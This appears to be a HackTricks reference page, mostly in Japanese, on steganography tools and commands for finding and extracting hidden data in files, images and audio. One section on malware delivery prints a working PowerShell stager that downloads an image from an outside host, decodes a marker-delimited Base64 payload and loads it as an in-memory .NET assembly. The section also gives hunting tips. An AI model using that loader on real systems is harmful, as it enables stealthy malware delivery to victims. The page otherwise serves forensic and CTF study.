# Stego Tricks

{{#include ../banners/hacktricks-training.md}}

## **ファイルからデータを抽出する**

### **Binwalk**

埋め込まれた隠しファイルやデータを検索するためのツールです。インストールは `apt` で行い、ソースは [GitHub](https://github.com/ReFirmLabs/binwalk) で入手できます。
```bash
binwalk file # Displays the embedded data
binwalk -e file # Extracts the data
binwalk --dd ".*" file # Extracts all data
```
### **Foremost**

ヘッダーとフッターに基づいてファイルを復元し、png画像に有用です。`apt`でインストールでき、そのソースは [GitHub](https://github.com/korczis/foremost) にあります。
```bash
foremost -i file # Extracts data
```
### **Exiftool**

ファイルのメタデータを表示するのに役立ちます。利用可能 [here](https://www.sno.phy.queensu.ca/~phil/exiftool/).
```bash
exiftool file # Shows the metadata
```
### **Exiv2**

exiftoolと同様、メタデータの表示用。 `apt`でインストール可能、ソースは[GitHub](https://github.com/Exiv2/exiv2)にあり、[official website](http://www.exiv2.org/)がある。
```bash
exiv2 file # Shows the metadata
```
### **File**

扱っているファイルの種類を特定します。

### **Strings**

ファイルから可読な文字列を抽出します。さまざまなエンコーディング設定を使用して出力をフィルタリングできます。
```bash
strings -n 6 file # Extracts strings with a minimum length of 6
strings -n 6 file | head -n 20 # First 20 strings
strings -n 6 file | tail -n 20 # Last 20 strings
strings -e s -n 6 file # 7bit strings
strings -e S -n 6 file # 8bit strings
strings -e l -n 6 file # 16bit strings (little-endian)
strings -e b -n 6 file # 16bit strings (big-endian)
strings -e L -n 6 file # 32bit strings (little-endian)
strings -e B -n 6 file # 32bit strings (big-endian)
```
### **Comparison (cmp)**

変更されたファイルを、オンラインで見つかるオリジナル版と比較するのに便利です。
```bash
cmp original.jpg stego.jpg -b -l
```
## **テキストからの隠しデータの抽出**

### **スペース内の隠しデータ**

一見空白に見えるスペース内の不可視文字が情報を隠している場合があります。このデータを抽出するには、次のサイトを参照してください: [https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder](https://www.irongeek.com/i.php?page=security/unicode-steganography-homoglyph-encoder).

## **画像からのデータ抽出**

### **GraphicMagick を使った画像の詳細確認**

[GraphicMagick](https://imagemagick.org/script/download.php) は画像ファイルタイプを判別し、破損の可能性を特定するために使用します。画像を検査するには、以下のコマンドを実行してください:
```bash
./magick identify -verbose stego.jpg
```
破損した画像を修復しようとする場合、メタデータコメントを追加すると役立つことがあります:
```bash
./magick mogrify -set comment 'Extraneous bytes removed' stego.jpg
```
### **Steghide によるデータ隠蔽**

Steghide は `JPEG, BMP, WAV, and AU` ファイル内にデータを隠すことができ、暗号化されたデータの埋め込みと抽出が可能です。インストールは `apt` を使って簡単に行え、[source code is available on GitHub](https://github.com/StefanoDeVuono/steghide)。

**コマンド:**

- `steghide info file` はファイルに隠しデータが含まれているかを表示します。
- `steghide extract -sf file [--passphrase password]` は隠しデータを抽出します（パスフレーズは任意）。

Web ベースで抽出する場合は、[this website](https://futureboy.us/stegano/decinput.html) を利用してください。

**Bruteforce Attack with Stegcracker:**

- Steghide のパスワードクラックを試みるには、[stegcracker](https://github.com/Paradoxis/StegCracker.git) を次のように使用します：
```bash
stegcracker <file> [<wordlist>]
```
### **zsteg for PNG and BMP Files**

zsteg は PNG と BMP ファイル内の隠しデータの発見に特化しています。インストールは `gem install zsteg` で行い、ソースは [source on GitHub](https://github.com/zed-0xff/zsteg) にあります。

**Commands:**

- `zsteg -a file` はファイルに対してすべての検出手法を適用します。
- `zsteg -E file` はデータ抽出のためのペイロードを指定します。

### **StegoVeritas and Stegsolve**

**stegoVeritas** はメタデータの確認、画像変換の実行、LSB brute forcing の適用などの機能を持ちます。オプション一覧は `stegoveritas.py -h`、すべてのチェックを実行するには `stegoveritas.py stego.jpg` を使用します。

**Stegsolve** は画像内の隠れたテキストやメッセージを明らかにするために様々なカラーフィルタを適用します。入手は [GitHub](https://github.com/eugenekolo/sec-tools/tree/master/stego/stegsolve/stegsolve) から可能です。

### **FFT for Hidden Content Detection**

Fast Fourier Transform (FFT) 技術は画像中の隠れたコンテンツをあぶり出すのに有効です。参考になるリソースには以下があります:

- [EPFL Demo](http://bigwww.epfl.ch/demo/ip/demos/FFT/)
- [Ejectamenta](https://www.ejectamenta.com/Fourifier-fullscreen/)
- [FFTStegPic on GitHub](https://github.com/0xcomposure/FFTStegPic)

### **Stegpy for Audio and Image Files**

Stegpy は画像やオーディオファイルに情報を埋め込むことができ、PNG、BMP、GIF、WebP、WAV などのフォーマットをサポートします。入手は [GitHub](https://github.com/dhsdshdhk/stegpy) で可能です。

### **Pngcheck for PNG File Analysis**

PNG ファイルを解析したり真正性を検証したりするには、次を使用してください:
```bash
apt-get install pngcheck
pngcheck stego.png
```
### **画像解析の追加ツール**

詳しく調べるには、次を参照してください:

- [Magic Eye Solver](http://magiceye.ecksdee.co.uk/)
- [Image Error Level Analysis](https://29a.ch/sandbox/2012/imageerrorlevelanalysis/)
- [Outguess](https://github.com/resurrecting-open-source-projects/outguess)
- [OpenStego](https://www.openstego.com/)
- [DIIT](https://diit.sourceforge.net/)

## マーカー区切りの Base64 ペイロードが画像に隠されるケース (malware delivery)

一般的なローダーは、正当な画像（多くは GIF/PNG）の中に平文の Base64 エンコードされたペイロードを埋め込むことが増えています。ピクセル単位の LSB の代わりに、ペイロードはファイルのテキスト/メタデータ内に埋め込まれた一意の開始/終了マーカー文字列で区切られます。A PowerShell stager は次のように動作します:
- Downloads the image over HTTP(S)
- Locates the marker strings (examples observed: <<sudo_png>> … <<sudo_odt>>)
- Extracts the between-text and Base64-decodes it to bytes
- Loads the .NET assembly in-memory and invokes a known entry method (no file written to disk)

最小限の PowerShell carving/loading スニペット
```powershell
$img = (New-Object Net.WebClient).DownloadString('https://example.com/p.gif')
$start = '<<sudo_png>>'; $end = '<<sudo_odt>>'
$s = $img.IndexOf($start); $e = $img.IndexOf($end)
if($s -ge 0 -and $e -gt $s){
$b64 = $img.Substring($s + $start.Length, $e - ($s + $start.Length))
$bytes = [Convert]::FromBase64String($b64)
[Reflection.Assembly]::Load($bytes) | Out-Null
}
```
注記
- This falls under ATT&CK T1027.003 (steganography). マーカー文字列はキャンペーンごとに異なります。
- Hunting: ダウンロードした画像を既知のデリミタでスキャンし、`PowerShell`が`DownloadString`の後に`FromBase64String`を使用しているものをフラグしてください。

See also phishing delivery examples and full in-memory invocation flow here:

{{#ref}}
../generic-methodologies-and-resources/phishing-methodology/phishing-documents.md
{{#endref}}

## **オーディオからのデータ抽出**

**Audio steganography** offers a unique method to conceal information within sound files. 隠されたコンテンツの埋め込みや抽出には様々なツールが使われます。

### **Steghide (JPEG, BMP, WAV, AU)**

SteghideはJPEG、BMP、WAV、AUファイルにデータを隠すための多用途なツールです。詳しい手順は[stego tricks documentation](stego-tricks.md#steghide)に記載されています。

### **Stegpy (PNG, BMP, GIF, WebP, WAV)**

このツールはPNG、BMP、GIF、WebP、WAVなど多くのフォーマットに対応しています。詳細は[Stegpy's section](stego-tricks.md#stegpy-png-bmp-gif-webp-wav)を参照してください。

### **ffmpeg**

ffmpegはオーディオファイルの整合性を評価する上で重要で、詳細情報を表示し不一致を特定するのに役立ちます。
```bash
ffmpeg -v info -i stego.mp3 -f null -
```
### **WavSteg (WAV)**

WavStegは、最下位ビット方式を用いてWAVファイル内にデータを隠蔽および抽出するのに優れています。利用は[GitHub](https://github.com/ragibson/Steganography#WavSteg)で可能です。コマンドは以下の通り：
```bash
python3 WavSteg.py -r -b 1 -s soundfile -o outputfile

python3 WavSteg.py -r -b 2 -s soundfile -o outputfile
```
### **Deepsound**

Deepsound は音声ファイル内の情報を AES-256 で暗号化して埋め込み、検出できます。ダウンロードは [the official page](http://jpinsoft.net/deepsound/download.aspx) から可能です。

### **Sonic Visualizer**

Sonic Visualizer は音声ファイルの視覚的および解析的な検査に非常に有用なツールで、他の手段では検出できない隠れた要素を明らかにできます。詳しくは [the official website](https://www.sonicvisualiser.org/) をご覧ください。

### **DTMF Tones - Dial Tones**

音声ファイル内の DTMF トーンの検出は、[this DTMF detector](https://unframework.github.io/dtmf-detect/) や [DialABC](http://dialabc.com/sound/detect/index.html) のようなオンラインツールで行えます。

## **その他の手法**

### **Binary Length SQRT - QR Code**

長さが平方数になるバイナリデータは QR Code を表している可能性があります。確認するには次のスニペットを使用してください:
```python
import math
math.sqrt(2500) #50
```
2進数から画像への変換については、[dcode](https://www.dcode.fr/binary-image) を参照してください。QRコードを読み取るには、[このオンラインバーコードリーダー](https://online-barcode-reader.inliteresearch.com/) を使用してください。

### **点字翻訳**

点字を翻訳するには、[Branah Braille Translator](https://www.branah.com/braille-translator) が優れたリソースです。

## **参考資料**

- [**https://0xrick.github.io/lists/stego/**](https://0xrick.github.io/lists/stego/)
- [**https://github.com/DominicBreuker/stego-toolkit**](https://github.com/DominicBreuker/stego-toolkit)
- [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)
- [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)

{{#include ../banners/hacktricks-training.md}}
